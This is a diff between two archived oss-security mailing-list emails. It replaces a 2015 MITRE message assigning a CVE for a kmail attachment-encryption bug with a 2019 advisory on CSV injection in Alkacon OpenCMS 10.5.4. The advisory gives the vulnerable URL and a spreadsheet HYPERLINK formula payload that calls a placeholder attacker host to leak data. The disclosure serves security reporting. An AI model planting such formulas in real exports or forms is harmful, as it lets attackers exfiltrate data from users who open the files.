@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2304" "Thursday" "16" "July" "2015" "18:34:11" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150716223411.647856C0769@smtpvmsrv1.mitre.org>" "51" "[oss-security] Re: CVE Request: kmail: Attachments are not encrypted when \"automatic encryption\" is selected" nil nil nil "7" "2015071622:34:11" "[oss-security] Re: CVE Request: kmail: Attachments are not encrypted when \"automatic encryption\" is selected" (number mark "        cve-assign@m Jul 16   51/2304  " thread-indent "\"[oss-security] Re: CVE Request: kmail: Attachments are not encrypted when \"automatic encryption\" is selected\"\n") "<20150715152055.GA13935@eldamar.local>" ("<20150715152055.GA13935@eldamar.local>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["434" "Sunday" "5" "May" "2019" "15:30:22" "+0530" "Pramod Rana" "varchashva@gmail.com" nil "12" nil nil nil nil "5" nil nil (number mark "U       varchashva@g May  5   12/434   " thread-indent "\"[oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 28570 invoked by uid 550); 16 Jul 2015 22:34:24 -0000
+Received: (qmail 7296 invoked by uid 550); 5 May 2019 10:35:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,64 +11,50 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 28546 invoked from network); 16 Jul 2015 22:34:23 -0000
-In-Reply-To: <20150715152055.GA13935@eldamar.local>
-Message-Id: <20150716223411.647856C0769@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Thu, 16 Jul 2015 18:34:11 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE Request: kmail: Attachments are not encrypted when "automatic encryption" is selected
-To: carnil@debian.org
+Received: (qmail 1782 invoked from network); 5 May 2019 10:00:45 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=u5HZkFfiNlZ2OSWttacQEEwjK+jRWtzmAsLj3TWD6F4=;
+        b=oUo7t2t1MzEolBr48Lfxf9tv5m516dVliu92ypRQngmTI2v+zNRKyurWGmf4Y1Mrtu
+         6xPv+dKBUeymvbJQ2WwoLJCBNMdIcjhBmsdK/pEdnYIjg/6Kjr4DUSZ1ZtmLQn3FSZBc
+         PR4EX2q+asAKDZRKFLD0SHBE86dmsuFtwqIBgmJnniR6jJRdf2SU/95DGggtcUUJDbvi
+         WGziLIUHalLbP7TBfdJbGUm2M2cFdIq3EaqcS6GFRf/6PNm3TcKxWv5RbEGqhEmAlZHd
+         W/YCcVvdM7XYui5XkXtFNde48P+69EZ46veNBsxz+eIF0h/t5ONSLw1DvsMobGChmqBX
+         ax6g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=u5HZkFfiNlZ2OSWttacQEEwjK+jRWtzmAsLj3TWD6F4=;
+        b=pyH1b6HEZ0EU2aPlG7QHBlyYkbPXH7Fzrnf+UUlEdwdGH9Emcx05QQ26B276n55xhJ
+         9Yq3sqv4EigqxBTo1dbQ4ha3yVV4DNSxos9hMwK05lgJ5uaK69+X28cg4DbMOHfsJR3t
+         OpDTQRpISMt5xkvElG/mocBmfdakqk7YBOywouCZ7L4jE46NQ4QDjPAlURolwsELeVin
+         RJTc2Se1CBGuM6TCHRI+HCigoY5bC17G4v0a+Q/0/Fb9ylfzxPVuOfR+cqC5tZvDmgk6
+         msn/LCPDGqaTgWn8TJ51wus/oLOuLwsnuPN8GZMitQBXVnKHuGPFvSZ0r39HU8Knrhjr
+         zJeQ==
+X-Gm-Message-State: APjAAAWS1rnM1Iw6QW+U1Su7xvgNDFNAH96+NV9311c2JnuLVngThnyn
+	XSXyf6hfcueNFV1YpsgTvKgTvz+84vaViobEC0ScpAQ=
+X-Google-Smtp-Source: APXvYqw3TvuPLWLaLZ5sfEgOI4eywn1m9ZJ7fpyJDXHHcHhTucleX7OXBu3QU1SgWo5XC00BHVMRQGjMcOB4vSEoR54=
+X-Received: by 2002:ae9:df03:: with SMTP id t3mr15316775qkf.346.1557050433564;
+ Sun, 05 May 2019 03:00:33 -0700 (PDT)
+MIME-Version: 1.0
+From: Pramod Rana <varchashva@gmail.com>
+Date: Sun, 5 May 2019 15:30:22 +0530
+Message-ID: <CALv8orHZc+_tuwny9g9JGQzX1VBES3L1OYjmdwNzeZNeRWAhJw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Description
+ - OpenCMS v10.5.4 and before is vulnerable to CSV injection in New
+User module for parameter First Name and Last Name
+ - Impacted URL is
+http://[your_webserver_ip]/opencms/system/workplace/admin/accounts/user_new.jsp
+ - Payload used is
+'=HYPERLINK("http://[attacker_ip:port]/GiveMeSomeData","IAmSafe")'
 
-> It was reported a while ago to the KDE Bugtracking System, that
-> attachments are not encrypted when "automatic encryption" is selected.
-> 
-> Upstream bugreport: https://bugs.kde.org/show_bug.cgi?id=340312
-> Fix: http://quickgit.kde.org/?p=kdepim.git&a=commit&h=626c857eb30c0533a4de7836ee843caaa8c00a26
-> Debian Bug: https://bugs.debian.org/791800
+Further details
+ - https://github.com/alkacon/opencms-core/issues/636
 
-Use CVE-2014-8878.
-
-Other comments (probably irrelevant):
-
-This general type of issue has been included in CVE before: see
-CVE-2014-5369.
-
-We feel that it is conceivable that this kmail behavior had been
-intentional. Encrypting attachments to arbitrary recipients, simply
-because a PGP key is known, has a usability problem. Some mail systems
-automatically and silently remove attachments that can't be scanned
-for malware (e.g., when the pre-encryption content type of the
-attachment is one that can have malware). This has, in some sense, a
-risk of "data corruption" because the meaning of a message can be
-vastly different if the attachment doesn't arrive. If the sender
-explicitly selects the "encrypt message" option, then that's a very
-strong signal that encryption is required, and kmail did encrypt
-attachments in that case. The "automatic encryption" implementation
-might have made a different tradeoff between security and usability.
-But, probably not. We decided to assign a CVE ID anyway because the
-commit refers to the change as a bug fix, because there was apparently
-no documentation of an intentional tradeoff, and because we're unaware
-of any widespread acceptance of a need to avoid encrypted attachments
-in some cases.
-
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
-
-iQEcBAEBAgAGBQJVqDDjAAoJEKllVAevmvmsgzsH/iMc5jgnkEvcCUgwObvTm7eP
-2NQS+e7XW/SW15wGSU0erqJIDH0T1rrB1X9iHARuaEHGu3ck1Rth2tu+BhofopCr
-eCmmNY+6fWYDGxFpKq+RsCOtzA0+2BaiKbXsANZBz9kTr3ZJuCkEf+5RHMtBeulH
-KlaOG7eODpatUSwMDTjlRmBsN2JLsQfJtxViHWGeBapAU/MSVzsfbC0QIJ7Srinu
-lk21yICJGj0wL4+EqLympWbn+r/m4XPcDqoEh/giJLKG4Q+fxulJPLG9Ze9wMF42
-/0NTs0pRsaQtTwhiKMmi5hl6QxBHhAhD8hZZNeJC7LaddrWA/iIi2ouvVcDcRw0=
-=/PrR
------END PGP SIGNATURE-----
+Already requested for CVE, yet to receive it.
